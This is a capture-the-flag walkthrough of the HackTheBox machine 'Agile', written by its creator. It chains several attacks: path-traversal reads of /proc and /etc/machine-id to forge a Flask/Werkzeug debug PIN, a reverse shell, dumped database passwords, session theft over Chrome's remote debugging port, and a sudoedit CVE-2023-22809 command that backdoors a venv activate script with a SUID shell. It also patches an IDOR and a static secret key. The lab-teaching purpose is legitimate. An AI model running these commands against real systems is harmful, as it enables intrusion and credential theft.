[HTB: Agile](#)




![](/img/agile-cover.png)

Agile is a box hosting a password manager solution. There's a file read
vulnerability in the application, and the Flask server is running in
debug mode. I'll use those to get execution on the box, which turns out
to be a bit trickier than expected. From there, I'll dump a user's
password out of the database and get an SSH shell. There's a testing
version of the app running as well, and I'll abuse Chrome debug to get
credentials from the testing Chrome instance to pivot to the next user.
This user can use sudoedit to modify files related to the test server.
I'll abuse CVE-2023-22809 to write into the virtual environment that
root is sourcing to get root. In Beyond Root, I'll show two unintended
vulnerabilities in the web application that got patched about a week
after release.

## Author's Note

Agile is the 5th box [I've had released](/about#generated-challenges) on
HackTheBox. It's always fun when I get to writeup my own creation, and
I'll take this chance to share a bit of background. I made this machine
to look at a bad take on an agile / CICD workflow. The box is supposed
to be a password manager product that is trying to be "agile", but doing
it all wrong. The developers here want to constantly be building the
site, and they have put Flask in debug mode so that it automatically
updates when there's a change. There's also a file read vulnerability in
the site. There's also a cron constantly running PyTest tests against
the site, a dev version. Finally, since this is the box used to host the
site and everything around it is involved with the site, the admin has
every user logging in sourcing the virtual environment constant running
of tests on the dev version of the website, which keeps selenium open
and chrome debug. The player can connect to this debug and get the
session, and pull another password from the test database. Finally, the
box is configured so that everyone logging in sources the venv used by
the application. The last user has sudo edit privileges over some files
as the admin, and CVE-2023-22809 can be used to edit the venv activate
script and get execution as root.

I had a lot of fun learning [HTMX](https://htmx.org/) for this box,
which doesn't come into the exploitation at all, but does provide a nice
layer to make responsive web applications. It's worth poking at how the
web application works to get a feel for it.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

The website is redirecting to `superpass.htb`.

I'll use `wfuzz` or `ffuf` to fuzz for other subdomains, but not find
any. I'll add `superpass.htb` to my `/etc/hosts` file.

### Website - TCP 80

#### Site

The site is a password manager:


![](/img/image-20230728151109112.png)
[![](/img/expand.png)](javascript:void(0) "Click to expand for full content"){onclick="click_expand_image(event)"}


I'll create an account and now I'm redirected to `/vault`:

![](/img/image-20230728151212598.png)

Clicking "Add a password" opens a form with the password already filled
in:

![](/img/image-20230728151329948.png)

Completing the rest of it and clicking the save / disk icon makes it no
longer editable:

![](/img/image-20230728151401486.png)

Pushing the export button will download a CSV:

![](/img/image-20230124070022667.png)

![](/img/image-20230728151429925.png)

#### Tech Stack

The HTTP response headers show NGINX, but nothing else:



    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Fri, 28 Jul 2023 19:10:58 GMT
    Content-Type: text.md; charset=utf-8
    Connection: close
    Content-Length: 6128



Guessing at extensions doesn't return anything. The 404 page matches the
[default 404](/htb-bagel.md#tech-stack) for Flask:

![](/img/image-20230728151646220.png)

This suggests the site is Python Flask.

#### Directory Brute Force

I'll run `feroxbuster` against the site, but it doesn't find anything I
haven't seen:


    oxdf@hacky$ feroxbuster -u http://superpass.htb --dont-extract-links

## Shell as www-data

### Export in More Detail

#### Enumeration

Looking in Burp, I'll see that when I click on Export, there's a GET
request to `/vault/export`, which returns a 302 to
`/download?fn=[username]_export_[some hex].csv`. Neither of these ever
show up in the browser address bar, because the end result is a file
that's downloaded.

![](/img/image-20230124105105827.png)

#### Vulnerabilities

There's two vulnerabilities to identify in `/download`. The first is a
directory traversal / file read vulnerability:

![](/img/image-20230124105329636.png)

The second is that if the file path isn't good, the page crashes
revealing that the server is running Flask in debug mode:

![](/img/image-20230124105409841.png)

### Flask Debug Execution

#### Background

The debug page for Flask is made for developers to find a crash and
figure out what happened. It gives not only the stack trace, but also
the ability to get a Python console and run additional commands at the
point of the crash. If I move my mouse over one of the outputs, the
little terminal logo appears:

![](/img/image-20230728153444859.png)

Clicking on the terminal pops a message asking for the PIN:

![](/img/image-20230124135056120.png)

This is a safety mechanism that wasn't present in early versions of the
debug page (added in [version
0.11](https://werkzeug.palletsprojects.com/en/2.3.x/changes/#version-0-11),
released Nov 2015). This pin is printed to the terminal when the Flask
site is run. If I have the pin, I can get execution on the system. To
calculate the pin, I'll need to collect a handful of strings from the
system, using the file read vulnerability.

[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
has a writeup on generating the pin, showing how it is generated in the
Flask (specifically in the `werkzeug` module) source, and providing a
script. I'll grab a copy of that script, and I'll need to update several
things. I've shown this before as an unintended method on
[OpenSource](/htb-opensource.md#shell-via-flask-debug-unintended).

The big trick on Agile is that most the guides (including the HackTricks
and my post) make assumptions about one of the items you need, and that
assumption is not always correct. I'll start following the guides, fail,
and then show how to fix it.

#### Public Bits

The first part of the script that requires updating is the list named
`probably_public_bits`.



    probably_public_bits = [
        'web3_user',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]



To get the username, I'll check `/proc/self/environ` using the file read
vuln:

![](/img/image-20230801122410810.png)

The server is running as www-data.

In previous guides, the second item is always given as "flask.app" and
the third as "Flask". We'll come back to these.

The fourth item is the full path to the application, which is in the
crashdump:

![](/img/image-20230728154053888.png)

My script looks like:



    probably_public_bits = [
        'www-data',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]



#### Private Bits

The next section is the list `private_bits`:



    private_bits = [
        '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
        'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
    ]



I'm going to switch to `curl` here for ease. I'll need to use
`--path-as-is` so that `curl` doesn't undo the `../`, and I'll need the
cookie, which I'll save in an env variable. I'll need to get the MAC
address. I can find that at `/sys/class/net/[device]/address`. To get
the device name, I'll pull `/proc/net/arp`:



    oxdf@hacky$ cookie="session=.eJwlzj0OwjAMQOG7ZGaIncQ_vUwVx7ZgbemEuDuV2N709H3Knkecz7K9jyseZX952cpMQegkZGndnMfEfqdWlYSIBPeqidw6rWU652CvyUiGzVFMqVWjlg6hstLMg5ciopvyjCHV2To1WUiTnIj53g_oQLEEpNyQ64zjr9Hy_QEv9zBO.ZMQS_Q.Z4LXfnoQS3utplGKkJ9ScRF8EMY"
    oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../proc/net/arp -s --path-as-is -b $cookie
    IP address       HW type     Flags       HW address            Mask     Device
    10.10.10.2       0x1         0x2         00:50:56:b9:1d:c2     *        eth0



The device is `eth0`, which I'll use to get the MAC:



    oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../sys/class/net/eth0/address -s --path-as-is -b $cookie
    00:50:56:b9:48:b5



The script needs this as an int, which I can use Python to convert:



    >>> int("00:50:56:b9:48:b5".replace(':',''), 16)
    345052367029



The next item is a combination of a couple files. First, I need
`/etc/machine-id`:



    oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../etc/machine-id -s --path-as-is -b $cookie
    ed5b159560f54721827644bc9b220d00



I'll also need the first line of `/proc/self/cgroup`, from the last "/"
to the end:



    oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../proc/self/cgroup -s --path-as-is -b $cookie
    0::/system.slice/superpass.service



I only need the "superpass.service" part.

Putting that all together updates the script to:



    private_bits = [
        '345052367029',# str(uuid.getnode()),  /sys/class/net/ens33/address
        'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
    ]



#### Hash Algorithm

I'll run this and it outputs a pin:



    oxdf@hacky$ python agile.py 
    276-150-242



But it doesn't work:

![](/img/image-20230728170845041.png)

One possible issue has to do with the hash algorithm in use. Werkzurg
updated their code from MD5 to SHA1 a while ago. At the time of Agile's
release, there was a note on the Hacktricks page:

> If you are on a new version of Werkzeug, try changing the hashing
> algorithm to sha1 instead of md5.

By the time Agile is retiring, the script is just updated to use SHA1.
To verify this, I'll pull the file from Agile and confirm it's using
SHA1 (not MD5):

![](/img/image-20230124141825362.png)

I'll make sure my script is not using MD5, and if it is, fix it:



    ...[snip]...
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
    ...[snip]...



Now on running this generates a new pin:



    oxdf@hacky$ python agile.py 
    962-630-184



But it still doesn't work.

#### getattr(app, '\_\_name\_\_')

Guides show the third item in `probably_public_bits` typically as just
"Flask", but that isn't always the case. It has to do with how Flask is
launched on the host.

I'll demonstrate that in [this
video](https://www.youtube.com/watch?v=6BWaea0nfE0) where I make a
HelloWorld Flask application and show how the variables change.


# ایک خرابی پیش آ گئی۔ {#ایک-خرابی-پیش-آ-گئی .message}

[اس ویڈیو کو www.youtube.com پر دیکھنے کی کوشش

*Side note: I'm still very interested in why Ubuntu Desktop doesn't
return "correct" values for `getnode`. If you have any idea, please
reach out to me on Twitter or Discord).*

In this [next video](https://www.youtube.com/watch?v=MVItEDBBcgg), I'll
collect the correct data for Agile to get the pin:


# ایک خرابی پیش آ گئی۔ {#ایک-خرابی-پیش-آ-گئی .message}

کریں](https://www.youtube.com/watch?v=MVItEDBBcgg){target="_blank"} یا

I'll see how the application is running, recreate a version of it on my
machine. In that version, I'll update the Werkzeug package to print the
things that go into the pin when it's created, and show that it actually
prints three times:



    (venv) oxdf@hacky$ python wsgi.py 
     * Serving Flask app 'superpass.app'
     * Debug mode: on
    WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
     * Running on http://127.0.0.1:5000

     * Debugger PIN: 659-317-709



With some playing around, I'll see that what I need is "wsgi_app", which
comes from the fact that this is served using Gunicorn.

#### Success

I'll update and get a new pin, and it works:

![](/img/image-20230124142043404.png)

### Shell

It looks like the `os` module is imported already:

![](/img/image-20230124142118360.png)

I'll use Python #2 from [revshells.com](https://www.revshells.com/),
pasting it directly into the console:

![](/img/image-20230124142547688.png)

The page hangs, but I get a shell:



    oxdf@hacky$ nc -lvnp 443
    Listening on 0.0.0.0 443
    Connection received on 10.1.1.105 51078
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)



## Shell as corum

The shell will only last about 5 minutes based on the connection, so
it's important to work quick (or just get another shell). With access as
www-data, I can read the DB connection string from
`/app/config_prod.json`:



    (venv) www-data@agile:/app$ cat config_prod.json
    {"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}



I'll use that to connect to the database and dump the passwords:



    (venv) www-data@agile:/app$ mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
    ...[snip]...
    mysql> select * from passwords;

There's a password for "agile" for the corum user. It works over ssh:



    oxdf@hacky$ sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@superpass.htb
    ...[snip]...
    corum@agile:~$



## Shell as edwards

### Enumeration

#### Web Apps

There's a parallel testing/dev instance of the site in `/app`:



    corum@agile:/app$ ls -l
    total 24
    drwxr-xr-x 5 corum     runner    4096 Jan 23 21:50 app
    drwxr-xr-x 8 runner    runner    4096 Jan 25 17:29 app-testing
    -r--r----- 1 dev_admin www-data    88 Jan 25 00:00 config_prod.json
    -r--r----- 1 dev_admin runner      99 Jan 25 15:15 config_test.json
    -rwxr-xr-x 1 root      runner     557 Jan 25 17:36 test_and_update.sh
    drwxrwxr-x 5 root      dev_admin 4096 Jan 25 17:21 venv



As corum, I'm able to access everything in `app`. I can read almost
everything in `app-testing` as well.

The `test_and_update.sh` script is also readable:



    #!/bin/bash

    # update prod with latest from testing constantly assuming tests are passing

    echo "Starting test_and_update"
    date

    # if already running, exit
    ps auxww | grep -v "grep" | grep -q "pytest" && exit

    echo "Not already running. Starting..."

    # start in dev folder
    cd /app/app-testing

    # system-wide source doesn't seem to happen in cron jobs
    source /app/venv/bin/activate

    # run tests, exit if failure
    pytest -x 2>&1 >/dev/null || exit

    # tests good, update prod (flask debug mode will load it instantly)
    cp -r superpass /app/app/
    echo "Complete!"



It checks if `pytest` is already running, and if so, exits. Then it goes
into the `app-testing` folder, sources the local env that's shared
between the apps, and calls `pytest`. If it succeeds, it copies the
`superpass` folder into `/app/app` (if it passes tests, deploy!).

There's one file of tests in `app-testing`:



    corum@agile:/app/app-testing/tests/functional$ ls -l
    total 12
    drwxrwxr-x 2 runner runner 4096 Jan 25 17:06 __pycache__
    -rw-r----- 1 dev_admin runner   34 Jan 25 15:15 creds.txt
    -rw-r--r-- 1 runner runner 2663 Jan 25 17:05 test_site_interactively.py



corum can't read `creds.txt`. It's used in `test_site_interactively` to
log into the page on `test.superpass.htb`:



    with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
        username, password = f.read().strip().split(':')
        
    ...[snip]...

    def test_login(driver):
        print("starting test_login")
        driver.get('http://test.superpass.htb/account/login')
        time.sleep(1)
        username_input = driver.find_element(By.NAME, "username")
        username_input.send_keys(username)
        password_input = driver.find_element(By.NAME, "password")
        password_input.send_keys(password)
        driver.find_element(By.NAME, "submit").click()
        time.sleep(3)
        title = driver.find_element(By.TAG_NAME, "h1")
        assert title.text == "Welcome to your vault"



It's using Selenium with headless Chrome to load the site:



    @pytest.fixture(scope="session")
    def driver():
        options = Options()
        #options.add_argument("--no-sandbox")
        options.add_argument("--window-size=1420,1080")
        options.add_argument("--headless")
        options.add_argument("--remote-debugging-port=41829")
        options.add_argument('--disable-gpu')
        options.add_argument('--crash-dumps-dir=/tmp')
        driver = webdriver.Chrome(options=options)
        yield driver
        driver.close()



The remote debug port is fixed on 41829.

#### test.superpass.htb

The `test.superpass.htb` site is defined in `cat superpass-test.nginx`:



    server {
        listen 127.0.0.1:80;
        server_name test.superpass.htb;

        location /static {
            alias /app/app-testing/superpass/static;
            expires 365d;
        }
        location / {
            include uwsgi_params;
            proxy_pass http://127.0.0.1:5555;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-Protocol $scheme;
        }
    }



It's only listening on localhost, and it's proxying everything to
localhost 5555. If I try to update my hosts file to include this domain
and access it directly, it just redirects to `superpass.htb`. That's
because I'm not coming from localhost. The easiest way to access it is
just to tunnel directly to TCP 5555 on Agile, so I'll do that by
reconnecting my SSH as corum with `-L 5555:localhost:5555`.

The page looks exactly the same, but there are a few differences:

-   The file read vuln doesn't work anymore:

![](/img/image-20230801130804616.png)

-   The server isn't running in debug mode:

![](/img/image-20230801130654093.png)

### Chrome Debug

Because the tests take a long time, this means the chrome debug port
will almost always be up.



    corum@agile:/app/app-testing/tests/functional$ netstat -tnlp | grep 41829
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      - 



I'll use SSH to tunnel 41829 on my host to 41829 on Agile.

I'll open Chromium and go to `chrome://inspect` and go to the devices
page:

![](/img/image-20230125130214794.png)

I'll add the port under Configure:

![](/img/image-20230125130242387.png)

And clicking done shows a new remote target:

![](/img/image-20230125130301432.png)

Clicking on "inspect" pops a dev tools instance connected to the testing
selenium:

![](/img/image-20230125130404589.png)

If I watch long enough or catch on at the right time, I can get a view
of edwards' vault. A more reliable way is to go to the application tab
where I can get the cookies in use:

![](/img/image-20230125130512878.png)

I can tunnel to port 5555, and add these cookies to my browser to get
access to a new vault:

![](/img/image-20230125130709692.png)

There's another password for "agile", for the edwards user.



    oxdf@hacky$ sshpass -p 'd07867c6267dcb5df0af' ssh edwards@superpass.htb
    ...[snip]...
    edwards@agile:~$



## Shell as root

### Enumeration

#### sudo

edwards can run `sudoedit` as dev_admin to edit the `config_test.json`
and the `creds.txt` file:



    edwards@agile:~$ sudo -l
    [sudo] password for edwards: 
    Matching Defaults entries for edwards on agile:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    User edwards may run the following commands on agile:
        (dev_admin : dev_admin) sudoedit /app/config_test.json
        (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt



I'll also note the version of `sudo` running here:



    edwards@agile:~$ sudo -V
    Sudo version 1.9.9
    Sudoers policy plugin version 1.9.9
    Sudoers file grammar version 48
    Sudoers I/O plugin version 1.9.9
    Sudoers audit plugin version 1.9.9



This version is vulnerable to
[CVE-2023-22809](https://security-tracker.debian.org/tracker/CVE-2023-22809).
This vulnerability allows a user to provide extra arguments in
user-proivded environment variables, allowing the attacker to access
additional files to process beyond the one's allowed by the config.
Applied here allows edwards to write any file as dev_admin, not just
these two.

#### venv

It turns out that any shell on Agile is running with the Python virtual
environment activated. There are a few different ways to find this.

In some reverse shells, just running `bash` will have the `(venv)`
prompt come on:

![](/img/image-20230125132102211.png)

If I look for where Python in on disk, I'll see it returns the one in
the `venv` folder, and that the `venv` folder has been added to the
front of the session's `PATH` variable:



    corum@agile:~$ which python
    /app/venv/bin/python
    corum@agile:~$ echo $PATH
    /app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin



This happens because the global `bashrc` file includes sourcing the venv
on this box:



    edwards@agile:~$ tail -2 /etc/bash.bashrc 
    # all users will want the env associated with this application
    source /app/venv/bin/activate



There's a hint at this in a comment in the `test_and_update.sh` script
as well:



    ...[snip]...
    # system-wide source doesn't seem to happen in cron jobs
    source /app/venv/bin/activate
    ...[snip]...



### Shell as root

root is periodically logging in, and each time it will source
`/app/venv/bin/activate`. If I can edit that, I can get execution as
root. This file is writable by root and dev_admin:



    edwards@agile:/$ ls -l /app/venv/bin/activate
    -rw-rw-r-- 1 root dev_admin 1976 Jan 25 18:24 /app/venv/bin/activate



I'll abuse CVE-2023-22809 to write this file as dev_admin:



    edwards@agile:/$ EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json 
    [sudo] password for edwards: 



In the file, I'll add code to create a SUID bash:

![](/img/image-20230125133012362.png)

After the next minute, the backdoor is now in `/tmp`, and gives a shell:



    edwards@agile:/$ /tmp/0xdf -p
    edwards@agile:/# id
    uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)



## Beyond Root

### Unintendeds Patched

Agile [was patched](https://app.hackthebox.com/machines/agile/changelog)
after it's week in the season scoring to fix two vulnerabilities:

![](/img/image-20230801134538403.png)

I'll look at each here.

### IDOR

There was an insecure direct object reference vulnerability in the
`get_password_by_id` function. This allowed users to find the
`/vault/row/<id>` endpoint and request passwords from other users,
leaking corum's password, skipping the Flask debug step.

The route used a function in
`/app/app/superpass/services/password_service.py` called
`get_password_by_id`.

The code on release day was this:



    def get_password_by_id(id: int, userid: int) -> Optional[Password]:

        session = db_session.create_session()
        password = session.query(Password)\
            .filter(
                Password.id == id,
                User.id == userid
            ).first()

        session.close()

        return password



On first look, it looks like the app is checking for passwords that
match the given ID and the current user's ID. Unfortunately for me, that
is a copy and paste typo, as the last check is comparing `User.id` and
`userid`. The function is called with the current user's ID, which is
`userid`. `User` is from the data models. The problem is that a Password
object doesn't have a User, so it makes no sense here, and just silently
does nothing. This was patched by changing the query to:



        password = session.query(Password)\
            .filter(
                Password.id == id,
                Password.userid == userid
            ).first()



### Cookie Crafting

The first step of the box is to use Flask debug to get onto the host and
get database access to get corum's password. This could be bypassed by
reading the source code for the application. On initial release, it has
a static `SECRET_KEY` value set at the top of the file:

![](/img/image-20230801140349030.png)

With access to this key, it is easy to forge a Flask cookie for any user
(like in [Rainyday](/htb-rainyday.md#cookie-generation) or
[Noter](/htb-noter.md#tech-stack)). Reading the
`/etc/passwd` file will give usernames to try, and then logged in as
corum, it's as simple as SSHing into Agile.

This was patched by setting this to a random 32 characters on each
application startup:



    app = flask.Flask(__name__)
    app.config['SECRET_KEY'] = os.urandom(32)



This strategy has drawbacks - if the application restarts, then all
existing cookies become invalid. That might bring real issues in the
real world, but it works perfectly well for a HTB machine.
